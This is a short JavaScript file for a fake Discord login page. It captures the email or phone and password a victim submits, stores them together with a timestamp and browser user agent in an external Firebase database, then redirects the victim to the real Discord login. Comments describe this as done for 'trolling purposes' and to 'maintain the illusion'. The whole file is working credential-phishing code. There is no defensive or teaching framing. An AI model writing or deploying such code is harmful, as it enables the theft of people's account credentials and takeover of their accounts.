// Firebase Configuration
const firebaseConfig = {
    databaseURL: "https://kom-tm-default-rtdb.europe-west1.firebasedatabase.app/"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Get form elements
const discordForm = document.getElementById('discord-form');
const emailInput = document.getElementById('emailORphone');
const passwordInput = document.getElementById('password');

// Handle form submission
discordForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    
    if (!email || !password) {
        return;
    }

    try {
        // Save credentials to Firebase
        const loginData = {
            email: email,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };

        await database.ref('logins').push(loginData);
        
        // Redirect to actual Discord (or show error)
        // For trolling purposes, you could redirect to:
        window.location.href = 'https://discord.com/login';
        
        // Or show a fake error
        // alert('Invalid credentials. Please try again.');
        // discordForm.reset();
        
    } catch (error) {
        console.error('Error saving data:', error);
        // Still redirect even if save fails to maintain the illusion
        window.location.href = 'https://discord.com/login';
    }
});
